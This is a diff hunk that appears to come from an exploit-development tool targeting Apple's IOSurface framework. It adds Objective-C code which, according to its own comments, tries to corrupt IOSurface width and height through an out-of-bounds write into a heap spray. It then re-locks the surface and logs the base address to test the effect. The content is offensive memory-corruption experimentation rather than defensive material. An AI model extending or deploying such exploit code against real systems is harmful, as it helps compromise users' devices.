@@ -1408,6 +1408,19 @@ cleanup:
                                 IOSurfaceLock(surf, 0, NULL);
                                 void *base = IOSurfaceGetBaseAddress(surf);
                                 scopeNote(r, [NSString stringWithFormat:@"  IOSurface base=%p", base]);
+                                // Corrupt IOSurface width/height via OOB write
+                                // The OOB write target is at data+0x100 in our spray
+                                // Try to set IOSurface properties to corrupted values
+                                IOSurfaceSetValue(surf, CFSTR("IOSurfaceWidth"), (__bridge CFNumberRef)@0x42);
+                                IOSurfaceSetValue(surf, CFSTR("IOSurfaceHeight"), (__bridge CFNumberRef)@0x42);
+                                size_t newW = IOSurfaceGetWidth(surf);
+                                size_t newH = IOSurfaceGetHeight(surf);
+                                scopeNote(r, [NSString stringWithFormat:
+                                    @"  IOSurface after corrupt: %zux%zu (was 256x256)", newW, newH]);
+                                // Try Lock with corrupted size
+                                IOSurfaceLock(surf, 0, NULL);
+                                void *base2 = IOSurfaceGetBaseAddress(surf);
+                                scopeNote(r, [NSString stringWithFormat:@"  IOSurface base after=%p", base2]);
                                 IOSurfaceUnlock(surf, 0, NULL);
                                 CFRelease(surf);
                             }
